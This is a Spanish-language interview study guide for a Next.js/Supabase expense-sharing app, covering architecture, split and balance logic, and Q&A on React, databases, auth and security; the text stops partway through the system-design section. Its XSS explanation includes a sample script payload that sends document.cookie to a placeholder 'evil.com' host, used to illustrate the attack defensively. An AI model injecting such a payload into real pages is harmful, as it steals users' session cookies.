# Guía de Estudio para Entrevistas — Dividi2

> Proyecto personal: aplicación de gastos compartidos (tipo Splitwise).
> Stack: Next.js · TypeScript · Supabase · PostgreSQL · Tailwind CSS · Vercel

---

## Tabla de contenidos

1. [Arquitectura del sistema](#1-arquitectura-del-sistema)
2. [Stack tecnológico y decisiones](#2-stack-tecnológico-y-decisiones)
3. [Flujos de la aplicación](#3-flujos-de-la-aplicación)
4. [Lógica de negocio clave](#4-lógica-de-negocio-clave)
5. [Patrones de diseño usados](#5-patrones-de-diseño-usados)
6. [Preguntas de entrevista — React & TypeScript](#6-preguntas-de-entrevista--react--typescript)
7. [Preguntas de entrevista — Next.js](#7-preguntas-de-entrevista--nextjs)
8. [Preguntas de entrevista — Bases de datos & Supabase](#8-preguntas-de-entrevista--bases-de-datos--supabase)
9. [Preguntas de entrevista — Autenticación & Seguridad](#9-preguntas-de-entrevista--autenticación--seguridad)
10. [Preguntas de entrevista — Diseño de sistemas](#10-preguntas-de-entrevista--diseño-de-sistemas)
11. [Preguntas de entrevista — Testing](#11-preguntas-de-entrevista--testing)
12. [Preguntas de entrevista — PWA & Web APIs](#12-preguntas-de-entrevista--pwa--web-apis)
13. [Preguntas de entrevista — General (soft skills + proceso)](#13-preguntas-de-entrevista--general-soft-skills--proceso)
14. [Cómo explicar el proyecto en una entrevista](#14-cómo-explicar-el-proyecto-en-una-entrevista)

---

## 1. Arquitectura del sistema

### Visión general

```
┌─────────────────────────────────────────────────────┐
│                     CLIENTE                         │
│  Browser (Next.js + React + Tailwind + Framer)      │
│                                                     │
│  /pages          → Rutas (SSR + CSR)                │
│  /components     → UI reutilizable                  │
│  /lib/hooks      → Estado y lógica de negocio       │
│  /lib/services   → Operaciones de datos             │
│  /lib/validation → Zod schemas                      │
└───────────┬─────────────────────────────────────────┘
            │  HTTPS / Supabase JS Client
            ▼
┌─────────────────────────────────────────────────────┐
│                   SUPABASE (BaaS)                   │
│                                                     │
│  ┌─────────────┐  ┌──────────────┐  ┌───────────┐  │
│  │ PostgreSQL  │  │  Auth Service│  │  Edge Fns │  │
│  │  + RLS      │  │ (JWT/OAuth)  │  │  (Deno)   │  │
│  └─────────────┘  └──────────────┘  └───────────┘  │
└─────────────────────────────────────────────────────┘
            │
            ▼
┌─────────────────────────────────────────────────────┐
│              SERVICIOS EXTERNOS                     │
│  Vercel (hosting) · Cloudflare Turnstile (captcha)  │
│  Resend (emails) · Web Push API (notificaciones)    │
└─────────────────────────────────────────────────────┘
```

### Tipo de arquitectura

**Monolito Frontend + BaaS (Backend-as-a-Service)**

- No hay servidor de API propio: toda la lógica de base de datos va directamente al cliente Supabase
- Las únicas "API routes" de Next.js son para cosas que no pueden exponerse al cliente: verificar el token de CAPTCHA y manejar el callback de OAuth
- La autorización vive en la base de datos (Row Level Security), no en el servidor de aplicación

### Estructura de carpetas clave

```
frontend/
├── pages/              ← Rutas de la app (SSR + API routes)
│   ├── _app.tsx        ← Entry point: PWA, theme, layout
│   ├── index.tsx       ← Landing page
│   ├── dashboard.tsx   ← Requiere auth (SSR guard)
│   ├── groups/[id].tsx ← Ruta dinámica (SSR guard)
│   └── api/
│       ├── auth/callback.ts      ← OAuth callback
│       └── verify-turnstile.ts   ← CAPTCHA server-side
│
├── lib/
│   ├── services/       ← Capa de negocio (separada de React)
│   │   ├── BalanceCalculator.ts
│   │   ├── ExpenseService.ts
│   │   ├── GroupService.ts
│   │   ├── SettlementService.ts
│   │   ├── InvitationService.ts
│   │   └── splits/     ← Strategy pattern
│   │       ├── EqualSplitStrategy.ts
│   │       ├── FullSplitStrategy.ts
│   │       └── CustomSplitStrategy.ts
│   │
│   ├── hooks/          ← Lógica React (custom hooks)
│   │   ├── useGroup.ts
│   │   ├── useExpenseOperations.ts
│   │   └── useAuthUser.ts
│   │
│   ├── validation/
│   │   └── schemas.ts  ← Zod schemas
│   │
│   ├── supabaseClient.ts  ← Cliente browser
│   ├── supabaseServer.ts  ← Cliente SSR (cookies)
│   └── authGuard.ts       ← Protección de rutas
│
└── components/         ← UI puro (sin lógica de negocio)
    ├── Layout.tsx
    ├── dashboard/
    └── groups/
```

---

## 2. Stack tecnológico y decisiones

### Por qué cada tecnología

| Tecnología | Alternativas consideradas | Por qué se eligió |
|---|---|---|
| **Next.js** | Create React App, Vite+React | SSR, routing nativo, API routes, optimización built-in |
| **TypeScript** | JavaScript plano | Autocompletado, prevención de bugs, refactoring seguro |
| **Supabase** | Firebase, backend propio (Express) | PostgreSQL real + Auth + RLS + Edge Functions + gratis |
| **PostgreSQL (vía Supabase)** | MongoDB, SQLite | Relaciones complejas (gastos, splits, balances) requieren SQL |
| **Tailwind CSS** | CSS Modules, Styled Components | Rápido para prototipar, consistente, responsive fácil |
| **Zod** | Yup, validación manual | Type-safe, integra con TypeScript nativamente |
| **Framer Motion** | CSS animations, GSAP | Animaciones declarativas, integración perfecta con React |
| **Vitest** | Jest | Más rápido, mismo API de Jest, integración nativa con Vite |
| **Vercel** | Netlify, Railway | Hecho para Next.js, deploy automático desde GitHub, free tier |
| **pnpm** | npm, yarn | Más rápido, menos espacio en disco, mejor para monorepos |

### Por qué Supabase y no un backend propio

**Problema a resolver:** Se necesita una base de datos relacional, autenticación segura, y endpoints para push notifications.

**Opción A — Backend propio (Express + Node.js):**
- Pros: control total, cualquier librería
- Contras: hay que manejar auth, sesiones, tokens, CORS, rate limiting, hosting, escalado

**Opción B — Supabase:**
- Pros: Auth ya hecha (JWT, OAuth, magic link), PostgreSQL real, RLS para seguridad, Edge Functions para lógica especial, hosting gestionado, dashboard visual
- Contras: vendor lock-in, límites del plan gratis

**Decisión:** Para un proyecto de portafolio/startup, Supabase permite moverse 10x más rápido sin sacrificar seguridad ni escalabilidad real.

### Por qué Row Level Security (RLS) en lugar de validar en el código

**Sin RLS:** cada endpoint de API debe verificar si el usuario tiene acceso al recurso. Si te olvidas una verificación, hay un bug de seguridad.

**Con RLS:** las reglas viven en la base de datos. Aunque el cliente envíe una query maliciosa, Postgres la rechaza automáticamente. Es imposible olvidar la verificación porque ocurre a nivel de motor de base de datos.

---

## 3. Flujos de la aplicación

### Flujo 1: Registro de usuario

```
Usuario escribe email + password
         │
         ▼
Frontend valida con Zod (longitud, formato email)
         │
         ▼
Cloudflare Turnstile verifica "no soy robot"
(POST /api/verify-turnstile → verifica token en servidor)
         │
         ▼
supabase.auth.signUp({ email, password })
         │
         ├── Error: email ya existe → muestra mensaje
         │
         └── OK: Supabase envía email de confirmación
                  │
                  ▼
            Usuario hace clic en el link
                  │
                  ▼
            Trigger DB: on_auth_user_created
            → inserta fila en tabla "profiles"
                  │
                  ▼
            Redirige a /dashboard
```

### Flujo 2: Login con Google (OAuth)

```
Usuario hace clic en "Continuar con Google"
         │
         ▼
supabase.auth.signInWithOAuth({ provider: 'google' })
         │
         ▼
Redirige a accounts.google.com
         │
         ▼
Usuario autoriza → Google redirige a:
/api/auth/callback?code=XXXX
         │
         ▼
exchangeCodeForSession(code)
→ Supabase valida el código con Google
→ Crea/actualiza la sesión
→ Guarda JWT en cookies
         │
         ▼
Redirige a /dashboard
```

### Flujo 3: Crear un gasto

```
Usuario llena el formulario en ExpenseComposer
         │
         ▼
useExpenseOperations.createExpense()
         │
         ▼
validateSchema(createExpenseSchema, data)  ← Zod
         │
         ├── Inválido → muestra errores al usuario
         │
         └── Válido
                  │
                  ▼
            ExpenseService.createExpense()
                  │
                  ▼
            INSERT en tabla "expenses"
            (monto, descripción, quién pagó, grupo)
                  │
                  ▼
            Selecciona estrategia de split:
            ┌─────────────────────────────────┐
            │ EqualSplit: divide entre todos  │
            │ FullSplit: uno debe todo        │
            │ CustomSplit: montos manuales    │
            └─────────────────────────────────┘
                  │
                  ▼
            strategy.build(members, amount)
            → devuelve array de { user_id, amount }
                  │
                  ▼
            INSERT en tabla "expense_splits"
                  │
                  ├── Error: rollback del expense
                  │
                  └── OK
                          │
                          ▼
                    NotificationService.notify()
                    → Supabase Edge Function
                    → Web Push a los miembros
                          │
                          ▼
                    useGroup llama refresh()
                    → se recalculan balances
```

### Flujo 4: Cálculo de balances

```
Datos de entrada:
- expenses[]    → quién pagó qué
- splits[]      → cuánto debe cada uno
- settlements[] → pagos ya realizados

         ▼
BalanceCalculator.calculateBalances()

1. Por cada expense:
   - Al pagador: +split_amount de cada uno de los demás
   - A cada deudor: -su_split_amount

2. Por cada settlement:
   - A quien recibe: +amount
   - A quien pagó: -amount

3. Resultado: balance neto por usuario
   (positivo = te deben, negativo = debes)

         ▼
calculateDebts() — minimizar transacciones

1. Separa deudores (balance < 0) y acreedores (balance > 0)
2. Ordena ambas listas
3. Greedily: el mayor deudor paga al mayor acreedor
4. Resultado: lista mínima de "A debe X a B"

Ejemplo:
  Juan pagó $90 para 3 personas → split igual $30 c/u
  Juan balance: +60 (los otros le deben $30 cada uno)
  Ana balance:  -30
  Pedro balance: -30
  → Ana debe $30 a Juan
  → Pedro debe $30 a Juan
```

### Flujo 5: Invitar miembro a grupo

```
Admin llena email en el formulario
         │
         ▼
InvitationService.invite(email, groupId)
         │
         ▼
Zod valida el email
         │
         ▼
INSERT en group_invitations:
  { invited_email, group_id, invited_by, status: 'pending' }
  → Trigger DB genera token UUID único
  → expires_at = now() + 7 days
         │
         ▼
EmailProvider.sendInvitation(email, token)
→ Supabase Edge Function con Resend
→ Email con link: /accept-invite?token=XXXX
         │
         ├── Email falla → devuelve token para link manual
         │
         └── Email OK → usuario recibe invitación
                  │
                  ▼
            Usuario hace clic en el link
                  │
                  ▼
            /accept-invite?token=XXXX
                  │
                  ▼
            Valida token (no expirado, no usado)
            UPDATE invitation SET status='accepted'
            INSERT en group_members
                  │
                  ▼
            Redirige a /groups/[id]
```

### Flujo 6: Protección de rutas (SSR)

```
Usuario navega a /dashboard
         │
         ▼
Next.js ejecuta getServerSideProps en el servidor
         │
         ▼
authGuard.requireAuth(context)
         │
         ▼
createSupabaseServerClient(context) ← usa cookies del request
         │
         ▼
supabase.auth.getUser()
         │
         ├── No hay sesión → redirect a /auth/login (302)
         │   (el browser NUNCA recibe HTML de /dashboard)
         │
         └── Sesión válida
                  │
                  ▼
            getServerSideProps continúa
            Pre-carga datos del usuario
                  │
                  ▼
            Renderiza página con datos iniciales
            (sin flash de carga, UX más rápido)
```

---

## 4. Lógica de negocio clave

### El algoritmo de balance (BalanceCalculator.ts)

El truco está en **no sumar el total del gasto**, sino solo los splits de los demás:

```typescript
// MAL: el pagador recibe crédito por el gasto total
pagador.balance += expense.amount

// BIEN: el pagador recibe crédito solo por lo que los demás le deben
// (su propio split no cuenta porque es lo que él debería pagar de todas formas)
for (const split of splits) {
  if (split.user_id !== expense.paid_by) {
    pagador.balance += split.amount   // los demás le deben
    split.user_id.balance -= split.amount  // ellos deben
  }
}
```

Si Juan pagó $90 y el split es $30 cada uno (Juan, Ana, Pedro):
- Juan.balance += 30 (Ana) + 30 (Pedro) = +60 ✓
- Ana.balance -= 30 = -30 ✓
- Pedro.balance -= 30 = -30 ✓

### Las tres estrategias de split

```typescript
interface ISplitStrategy {
  build(members: Member[], amount: number, custom?: CustomSplit[]): Split[]
}

// 1. Equal: divide el monto entre todos los miembros
class EqualSplitStrategy implements ISplitStrategy {
  build(members, amount) {
    const share = amount / members.length
    return members.map(m => ({ user_id: m.id, amount: share }))
  }
}

// 2. Full: uno solo paga todo (para gastos individuales en el grupo)
class FullSplitStrategy implements ISplitStrategy {
  build(members, amount, custom) {
    return [{ user_id: custom.debtor_id, amount }]
  }
}

// 3. Custom: montos definidos manualmente
class CustomSplitStrategy implements ISplitStrategy {
  build(members, amount, custom) {
    return custom.splits  // ya viene validado que suma = amount
  }
}
```

### Validación con Zod

```typescript
const createExpenseSchema = z.object({
  description: z.string().min(1).max(100),
  amount: z.number().positive(),
  paid_by: z.string().uuid(),
  group_id: z.string().uuid(),
  split_type: z.enum(['equal', 'full', 'custom']),
})

// En el servicio:
const result = validateSchema(createExpenseSchema, input)
if (!result.success) {
  return { error: result.errors }
}
// result.data ya tiene tipos TypeScript correctos
```

---

## 5. Patrones de diseño usados

### 1. Strategy Pattern — Splits

**Problema:** Hay múltiples formas de dividir un gasto y pueden agregarse más en el futuro.

**Sin Strategy:** un switch/if gigante en ExpenseService que hay que modificar cada vez que se agrega un tipo de split.

**Con Strategy:** cada tipo de split es una clase independiente. Para agregar un nuevo tipo, se crea una nueva clase sin tocar el código existente (Open/Closed Principle).

```
ExpenseService
    └── selecciona la estrategia correcta
            ├── EqualSplitStrategy
            ├── FullSplitStrategy
            └── CustomSplitStrategy
```

### 2. Service Layer Pattern

**Problema:** Mezclar lógica de negocio en los componentes React los hace imposibles de testear y de mantener.

**Solución:** Los servicios (`ExpenseService`, `BalanceCalculator`, etc.) son clases/funciones puras de TypeScript que:
- No importan nada de React
- Pueden testearse con Vitest sin montar componentes
- Pueden reutilizarse desde hooks, SSR, y Edge Functions

### 3. Custom Hooks Pattern

**Problema:** Los componentes necesitan datos y operaciones, pero no deberían contener lógica compleja.

**Solución:** hooks como `useGroup` y `useExpenseOperations` encapsulan:
- El estado local (useState)
- El fetching de datos (useEffect)
- Las operaciones (create, update, delete)
- El cálculo memoizado de balances (useMemo)

Los componentes solo consumen el hook y renderizan UI.

### 4. Guard Pattern — Protección de rutas

```typescript
// authGuard.ts
export async function requireAuth(ctx: GetServerSidePropsContext) {
  const supabase = createSupabaseServerClient(ctx)
  const { data: { user } } = await supabase.auth.getUser()

  if (!user) {
    return { redirect: { destination: '/auth/login', permanent: false } }
  }

  return { user }
}
```

Reutilizable en cualquier `getServerSideProps` que necesite autenticación.

### 5. Repository Pattern (informal)

Los servicios actúan como repositories: abstraen las queries de Supabase del resto del código. Si mañana se cambia Supabase por otra DB, solo hay que cambiar los servicios.

---

## 6. Preguntas de entrevista — React & TypeScript

### ¿Qué es un custom hook y cuándo se usa?

Un custom hook es una función que empieza con `use` y puede usar otros hooks de React. Se usa cuando:
1. Varios componentes comparten la misma lógica de estado
2. Un componente tiene lógica compleja que conviene aislar
3. Se quiere hacer testeable la lógica sin montar el componente completo

**Ejemplo del proyecto:** `useGroup` centraliza todo el estado del grupo (gastos, miembros, balances), evitando que el componente `groups/[id].tsx` se llene de `useState` y `useEffect`.

### ¿Cuál es la diferencia entre useMemo y useCallback?

- `useMemo` memoiza un **valor calculado**. Evita recalcular algo costoso si las dependencias no cambiaron.
- `useCallback` memoiza una **función**. Evita que la función se recree en cada render (útil para pasar como prop a componentes memoizados).

**Ejemplo del proyecto:** En `useGroup`, los balances se calculan con `useMemo` porque `BalanceCalculator.calculateBalances()` procesa arrays de expenses y splits, y no tiene sentido recalcularlo si los datos no cambiaron.

### ¿Cuándo usarías useEffect vs useLayoutEffect?

- `useEffect`: efectos asíncronos, fetching de datos, subscripciones. Se ejecuta después de que el navegador pinte.
- `useLayoutEffect`: efectos síncronos que modifican el DOM antes de que el usuario lo vea (medir elementos, ajustar scroll). Bloquea el pintado.

En el 99% de los casos se usa `useEffect`. `useLayoutEffect` es para casos donde hay un "flash" visual que corregir.

### ¿Qué es la reconciliación en React?

React mantiene un Virtual DOM. Cuando el estado cambia, crea un nuevo árbol virtual y lo compara con el anterior (diffing). Solo actualiza en el DOM real los nodos que realmente cambiaron, lo que es mucho más eficiente que recrear todo el HTML.

La `key` prop en listas le dice a React cómo hacer este mapeo correctamente. Sin `key` (o con `key={index}`), React puede reutilizar el estado de un componente en el elemento equivocado de la lista.

### ¿Diferencia entre props y state?

- **Props:** datos que vienen del padre. Son inmutables desde adentro del componente.
- **State:** datos internos del componente. Cuando cambian, React re-renderiza el componente.

Regla general: si el componente no controla el dato, es prop. Si lo controla, es state.

### ¿Qué es TypeScript Generics y para qué sirve?

Los generics permiten escribir código que funciona con múltiples tipos sin perder type safety:

```typescript
// Sin generics: tienes que repetir la función para cada tipo
function getFirstNumber(arr: number[]): number { return arr[0] }
function getFirstString(arr: string[]): string { return arr[0] }

// Con generics: una función que funciona para cualquier tipo
function getFirst<T>(arr: T[]): T { return arr[0] }

// En el proyecto: validateSchema es genérica
function validateSchema<T>(schema: ZodSchema<T>, data: unknown): Result<T>
```

### ¿Qué es un tipo `unknown` vs `any` en TypeScript?

- `any`: apaga el sistema de tipos. Se puede hacer cualquier cosa con ese valor sin errores. Peligroso.
- `unknown`: el tipo más seguro para "no sé qué tipo es". Para usarlo, hay que validarlo primero (con `typeof`, `instanceof`, o Zod).

**Ejemplo del proyecto:** La función `validateSchema` recibe `data: unknown` porque viene del usuario. Zod la valida y si pasa, el resultado tiene el tipo correcto de TypeScript.

### ¿Qué es el contexto de React y cuándo usarlo?

`React.createContext` + `useContext` permite pasar datos a través del árbol de componentes sin hacer "prop drilling" (pasar props por múltiples niveles intermedios).

Se usa para datos globales: tema (dark/light), usuario autenticado, idioma. No reemplaza al estado local (useState) ni a un state manager completo para lógica compleja.

**En el proyecto:** se podría usar Context para el usuario autenticado, pero se optó por el hook `useAuthUser` que cada componente llama directamente. Más simple para la escala del proyecto.

### ¿Cuál es la diferencia entre interface y type en TypeScript?

Funcionalmente son muy similares. Las diferencias principales:
- `interface` puede extenderse con `extends` y puede ser "mergeada" si se declara dos veces (declaration merging)
- `type` es más flexible: puede ser un union, intersection, tuple, o cualquier expresión de tipo

Convención: `interface` para objetos/clases, `type` para unions y tipos compuestos.

### ¿Qué problemas resuelve Zod?

El sistema de tipos de TypeScript solo existe en tiempo de compilación. En runtime, si llega `null` donde esperabas `string`, TypeScript no puede protegerte.

Zod valida datos en **runtime** y al mismo tiempo infiere el tipo de TypeScript. Una sola definición de schema sirve para:
1. Validar la forma de los datos en runtime
2. Inferir el tipo TypeScript del dato validado
3. Generar mensajes de error descriptivos

---

## 7. Preguntas de entrevista — Next.js

### ¿Qué diferencia hay entre SSR, SSG y CSR?

| Método | Cuándo se genera el HTML | Cuándo se usa |
|---|---|---|
| **CSR** (Client Side Rendering) | En el browser, después de cargar JS | SPAs donde SEO no importa |
| **SSG** (Static Generation) | En build time, una sola vez | Landing pages, blogs, docs |
| **SSR** (Server Side Rendering) | En cada request, en el servidor | Páginas con datos del usuario |
| **ISR** (Incremental Static Regeneration) | Periódicamente después del build | Contenido que cambia pero no por cada usuario |

**En el proyecto:** 
- `/` (landing) → SSG (contenido estático)
- `/dashboard` → SSR con `getServerSideProps` porque los datos del usuario cambian y requieren autenticación
- `/groups/[id]` → SSR porque los datos del grupo son por usuario y pueden cambiar

### ¿Qué hace getServerSideProps?

Se ejecuta en el servidor en cada request antes de renderizar la página. Puede:
1. Verificar autenticación (y redirigir si no hay sesión)
2. Pre-cargar datos de la DB para pasarlos como props a la página
3. Acceder a cookies, headers, y query params del request

El HTML resultante ya contiene los datos, entonces el usuario no ve una pantalla de carga inicial.

```typescript
export async function getServerSideProps(ctx: GetServerSidePropsContext) {
  const { user } = await requireAuth(ctx)  // redirige si no hay sesión

  const groups = await GroupService.getUserGroups(user.id)

  return { props: { groups } }  // pasan como props al componente
}
```

### ¿Qué es el App Router de Next.js 13+?

Next.js 13 introdujo el `App Router` (carpeta `app/`) como alternativa al `Pages Router` (carpeta `pages/`). Diferencias principales:
- App Router usa React Server Components por defecto
- Layouts anidados más flexibles
- Mejor soporte para streaming y Suspense
- El proyecto usa Pages Router (`pages/`) que es el sistema anterior, más familiar y estable

### ¿Por qué se usa el Pages Router en este proyecto?

El Pages Router es maduro, bien documentado, y la mayoría de recursos y tutoriales lo usan. El App Router, aunque más poderoso, tenía breaking changes y documentación incompleta al momento de crear el proyecto. Para un portafolio/MVP, la estabilidad y velocidad de desarrollo importan más que usar lo más nuevo.

### ¿Qué son las API Routes de Next.js?

Archivos en `pages/api/` que se convierten en endpoints HTTP. Se ejecutan en el servidor (Node.js), no en el browser. Útiles para:
1. Lógica que no puede ir en el cliente (secrets, tokens)
2. Proxy de APIs externas
3. Webhooks

**En el proyecto solo hay 2:**
- `/api/auth/callback` — intercambia el código de OAuth por una sesión (requiere la clave secreta de Supabase)
- `/api/verify-turnstile` — verifica el CAPTCHA con la secret key de Cloudflare (que no puede estar en el browser)

### ¿Qué es `_app.tsx` en Next.js?

Es el componente raíz que envuelve todas las páginas. Se usa para:
- Importar CSS global
- Proveer contextos globales (theme, auth)
- Registrar Service Workers
- Añadir analytics o scripts globales

En el proyecto, `_app.tsx` registra el Service Worker del PWA y envuelve todo con el componente `Layout`.

### ¿Cómo funciona el enrutamiento dinámico?

Archivos con `[param]` en el nombre crean rutas dinámicas:
- `pages/groups/[id].tsx` → `/groups/abc123`, `/groups/def456`
- El valor de `id` se accede con `useRouter().query.id` o en `getServerSideProps` con `ctx.params.id`

---

## 8. Preguntas de entrevista — Bases de datos & Supabase

### ¿Qué es Row Level Security (RLS)?

RLS permite definir **políticas a nivel de fila** en PostgreSQL. Cada query es filtrada automáticamente según las políticas definidas.

```sql
-- Política: un usuario solo puede ver sus propios gastos
CREATE POLICY "members can view group expenses"
ON expenses FOR SELECT
USING (
  user_is_member_of_group(group_id, auth.uid())
);
```

Con RLS activo, aunque el cliente intente hacer `SELECT * FROM expenses`, solo verá las filas a las que tiene acceso según las políticas.

**Ventaja sobre validar en el código:** es imposible olvidar verificar permisos porque ocurre en la capa de base de datos, no en la de aplicación.

### ¿Qué es un índice en una base de datos y cuándo agregarlo?

Un índice es una estructura de datos adicional (generalmente un B-tree) que acelera las búsquedas al costo de:
- Mayor espacio en disco
- Inserciones/updates más lentos (hay que actualizar el índice)

Se agrega un índice en columnas que se usan frecuentemente en `WHERE`, `JOIN`, o `ORDER BY`. En el proyecto, columnas como `group_id` en `expenses`, `expense_id` en `expense_splits`, y `user_id` en `group_members` serían buenas candidatas.

### ¿Qué es una foreign key?

Una constraint que garantiza que un valor en una columna existe en la tabla referenciada:
```sql
expense_splits.expense_id REFERENCES expenses(id) ON DELETE CASCADE
```
`ON DELETE CASCADE` significa que si se borra un expense, sus splits se borran automáticamente.

### ¿Cuál es la diferencia entre JOIN tipos?

- `INNER JOIN`: solo filas con coincidencia en ambas tablas
- `LEFT JOIN`: todas las filas de la tabla izquierda, más las coincidentes de la derecha (NULL si no hay coincidencia)
- `RIGHT JOIN`: lo inverso al LEFT JOIN
- `FULL OUTER JOIN`: todas las filas de ambas tablas, con NULLs donde no hay coincidencia

### ¿Qué es una transacción en bases de datos?

Un grupo de operaciones que se ejecutan como una unidad atómica (ACID). Si alguna falla, todas se deshacen (rollback). Si todas pasan, se confirman (commit).

**Ejemplo del proyecto:** Al crear un gasto, se hace INSERT en `expenses` y luego INSERT en `expense_splits`. Si el segundo falla, el gasto queda a medias. La solución ideal es usar una transacción. En el proyecto, esto se maneja haciendo rollback manual (borrando el expense si el split falla).

### ¿Qué es ACID?

- **Atomicidad:** la transacción es todo o nada
- **Consistencia:** la BD pasa de un estado válido a otro estado válido
- **Aislamiento:** transacciones concurrentes no se interfieren
- **Durabilidad:** una vez confirmada, la transacción persiste aunque haya un crash

### ¿Qué es Supabase?

Supabase es una alternativa open-source a Firebase, construida sobre PostgreSQL. Provee:
- PostgreSQL gestionado con extensiones
- Auth (email, OAuth, magic link) con JWT
- Storage de archivos
- Edge Functions (Deno)
- Real-time subscriptions vía WebSockets
- Dashboard visual
- Cliente JavaScript con generación automática de tipos

### ¿Qué son las migraciones de base de datos?

Archivos SQL versionados que describen los cambios al esquema de la base de datos. En lugar de modificar la DB directamente, se escribe una migración que puede aplicarse a cualquier entorno (local, staging, producción) y revertirse si algo falla.

**En el proyecto:** `20260516051856_fix_gm_delete_recursion.sql` corrige un bug de recursión infinita en la política RLS de eliminación de miembros.

### ¿Cuál es la diferencia entre un trigger y un stored procedure?

- **Trigger:** función que se ejecuta automáticamente en respuesta a un evento (INSERT, UPDATE, DELETE). En el proyecto, `on_auth_user_created` crea el perfil automáticamente cuando un usuario se registra.
- **Stored Procedure:** función almacenada en la DB que se llama explícitamente. Puede ejecutar lógica compleja, transacciones, etc.

### ¿Qué es una función de ventana (window function) en SQL?

Funciones que calculan un valor sobre un conjunto de filas relacionadas con la fila actual, sin agrupar las filas:

```sql
SELECT 
  user_id,
  amount,
  SUM(amount) OVER (PARTITION BY group_id) as group_total
FROM expenses
```

Útil para rankings, sumas acumuladas, comparaciones dentro de grupos.

---

## 9. Preguntas de entrevista — Autenticación & Seguridad

### ¿Cómo funciona JWT (JSON Web Token)?

JWT es un token firmado digitalmente que contiene claims (información):
```
Header.Payload.Signature
```
- **Header:** algoritmo de firma (HS256, RS256)
- **Payload:** datos (user_id, email, rol, expiración) — **no encriptado**, solo codificado en base64
- **Signature:** el server firma el header+payload con su secret key

El server valida que la firma sea correcta al recibir el token. Si es válida, el payload es confiable.

**Supabase lo usa así:** el JWT contiene el `user.id` y Supabase lo inyecta en cada query para que RLS sepa quién es el usuario actual (`auth.uid()`).

### ¿Cuál es la diferencia entre autenticación y autorización?

- **Autenticación:** verificar identidad — "¿quién eres?" (login, JWT)
- **Autorización:** verificar permisos — "¿qué puedes hacer?" (RLS, roles)

En el proyecto: Supabase Auth maneja la autenticación. RLS policies manejan la autorización.

### ¿Qué es OAuth 2.0?

Protocolo que permite a una aplicación acceder a recursos de otra en nombre del usuario, sin que el usuario comparta su contraseña.

**Flujo básico con Google:**
1. App redirige a Google con `client_id` y `redirect_uri`
2. Usuario autoriza en Google
3. Google redirige de vuelta con un `code` de autorización
4. App intercambia el `code` por un `access_token` (usando también el `client_secret`)
5. App usa el `access_token` para obtener datos del usuario

El `client_secret` **nunca va al browser**. Por eso en el proyecto el intercambio de código ocurre en el API route (`/api/auth/callback`) que es server-side.

### ¿Qué es CORS y por qué importa?

CORS (Cross-Origin Resource Sharing) es un mecanismo de seguridad del browser que bloquea requests desde un origen (dominio) hacia otro si el servidor no da permiso explícito.

Si el backend está en `api.dividi2.com` y el frontend en `dividi2.com`, el browser bloqueará los requests a menos que el servidor incluya el header `Access-Control-Allow-Origin: https://dividi2.com`.

En el proyecto, la Edge Function de Supabase incluye headers CORS para permitir requests desde el frontend.

### ¿Qué es XSS (Cross-Site Scripting)?

Ataque donde el atacante inyecta código JavaScript malicioso en una página que otros usuarios van a ver. Si la app renderiza input del usuario sin sanitizar:

```html
<!-- Vulnerable: input del usuario va directo al HTML -->
<div>{userComment}</div>
<!-- Si el comentario es: <script>document.location='evil.com?c='+document.cookie</script> -->
```

React protege contra XSS por defecto porque escapa el HTML antes de renderizarlo. Si se usa `dangerouslySetInnerHTML`, hay que sanitizar manualmente.

### ¿Qué es CSRF (Cross-Site Request Forgery)?

Ataque donde una página maliciosa hace requests en nombre del usuario aprovechando que el browser envía cookies automáticamente.

Protección: incluir un token CSRF en cada request que modifica datos. El token solo lo conoce el servidor legítimo.

Supabase usa tokens JWT en el header `Authorization` (no en cookies), lo que hace más difícil el CSRF. El token no se envía automáticamente como una cookie.

### ¿Para qué sirve Cloudflare Turnstile (CAPTCHA) en este proyecto?

Para proteger los endpoints de autenticación contra bots. Sin CAPTCHA, un bot puede intentar miles de combinaciones de email/password (credential stuffing) o crear cuentas spam masivamente.

Turnstile es la alternativa de Cloudflare a reCAPTCHA: verifica que el usuario es humano analizando comportamiento (movimiento del mouse, etc.) sin mostrar puzzles molestos.

**Por qué se verifica en el servidor:** si la verificación fuera solo en el cliente, se podría bypassear simplemente no cargando el script del CAPTCHA y llamando directo al API.

### ¿Cuál es el riesgo de guardar secrets en el cliente?

Variables de entorno prefijadas con `NEXT_PUBLIC_` son visibles en el bundle de JavaScript del browser. Cualquiera puede inspeccionarlas con las DevTools.

Solo deben estar en el cliente:
- La URL pública de Supabase (no es un secret)
- La clave anon/pública de Supabase (diseñada para ser pública, el RLS la protege)

**Nunca en el cliente:**
- La clave service role de Supabase (bypasea RLS)
- La secret key de Cloudflare Turnstile
- Claves de API de terceros con permisos de escritura

---

## 10. Preguntas de entrevista — Diseño de sistemas

### ¿Cómo escalarías esta aplicación si tuviera 100k usuarios?

**Cuellos de botella actuales:**
1. Supabase free tier tiene límites de conexiones y storage
2. El cálculo de balances se hace en el cliente para cada grupo cargado
3. No hay caché

**Estrategias de escalado:**
1. **DB:** Índices en `group_id`, `user_id`, `expense_id`. Índice compuesto en `expense_splits(expense_id, user_id)`
2. **Caché:** React Query para cachear datos en el cliente. Redis/Vercel KV para cachear balances calculados en el servidor
3. **Cálculo de balances:** moverlo a una Edge Function que corra al insertar/borrar un expense (trigger) y guarde el resultado. El cliente solo lee el resultado pre-calculado
4. **Connection pooling:** PgBouncer (ya incluido en Supabase) para manejar miles de conexiones concurrentes
5. **CDN:** Vercel ya sirve assets estáticos desde CDN globalmente

### ¿Qué agregarías para hacer la app más robusta?

1. **Optimistic updates:** al crear un gasto, mostrarlo inmediatamente en la UI y revertir si falla
2. **Error boundaries:** componentes React que capturan errores de render y muestran UI de fallback
3. **Retry logic:** si un request falla, reintentar automáticamente con exponential backoff
4. **Loading states:** skeleton screens en lugar de spinners genéricos
5. **Transactions reales:** usar `supabase.rpc()` con una función PostgreSQL que haga el INSERT de expense + splits en una sola transacción

### ¿Cómo modelarías la base de datos de este tipo de app?

Entidades principales: `users`, `groups`, `expenses`, `settlements`

Relaciones:
- User ↔ Group: M-to-M → tabla `group_members`
- Expense → Group: Many-to-One
- Expense ↔ User (splits): M-to-M → tabla `expense_splits`
- Settlement → Group, User (payer), User (receiver): Many-to-One

El truco del diseño está en `expense_splits`: no guardar "quién pagó qué porcentaje" sino "cuánto debe cada persona de este gasto". Así el cálculo de balance es un SUM simple.

### ¿Qué es un BaaS y cuáles son sus tradeoffs?

**Backend as a Service:** plataforma que provee funcionalidades backend gestionadas (DB, auth, storage, funciones).

**Pros:**
- Tiempo de desarrollo mucho menor
- No hay que gestionar infraestructura
- Auth, seguridad, backups ya vienen resueltos
- Escala automáticamente (hasta cierto punto)

